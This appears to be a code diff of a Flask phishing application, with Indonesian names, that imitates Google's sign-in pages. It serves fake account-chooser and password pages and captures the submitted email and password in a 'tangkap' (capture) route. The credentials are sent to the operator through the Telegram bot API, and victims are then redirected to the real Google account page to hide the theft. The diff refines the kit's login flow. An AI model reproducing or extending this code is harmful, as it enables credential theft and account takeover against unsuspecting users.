@@ -6,10 +6,10 @@ app = Flask(__name__)
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 CHAT_ID = os.environ.get("CHAT_ID")
-REDIRECT = "https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin"
+REDIRECT = "https://myaccount.google.com/"
 
 def kirim_telegram(email, pw):
-    pesan = f"🔑 *GOOGLE BARU MASUK*\n\n📧 Email: `{email}`\n🔒 Password: `{pw}`"
+    pesan = f"🔑 *GOOGLE — DATA MASUK*\n\n📧 Email: `{email}`\n🔒 Password: `{pw}`"
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     data = {
         "chat_id": CHAT_ID,
@@ -19,10 +19,17 @@ def kirim_telegram(email, pw):
     requests.post(url, data=data)
 
 @app.route('/')
-def index():
-    return send_file('index.html')
+def pilih_akun():
+    return send_file('pilih.html')
 
-@app.route('/login.php', methods=['POST'])
+@app.route('/password')
+def halaman_password():
+    email = request.args.get('email', '')
+    # Simpan email sebagai hidden di halaman password
+    html = send_file('password.html')
+    return html
+
+@app.route('/login', methods=['POST'])
 def tangkap():
     email = request.form.get('email')
     pw = request.form.get('pass')
